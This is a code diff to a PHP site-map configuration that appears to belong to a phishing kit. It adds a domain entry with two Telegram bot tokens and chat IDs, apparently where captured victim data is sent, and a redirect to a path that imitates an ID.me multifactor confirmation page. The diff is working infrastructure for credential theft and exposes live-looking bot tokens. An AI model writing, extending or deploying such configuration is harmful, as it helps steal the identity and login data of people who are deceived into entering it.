@@ -11,6 +11,18 @@ $site_map = [
         ],
         'redirect' => 'https://illuminatiofficial.world/index.html'
     ],
+
+
+    'paysphere.42web.io' => [
+        'bots' => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+
+            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
+        ],
+        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
+    ],
+
+
     
     'illuminatiofficial.world' => [
         'bots' => [
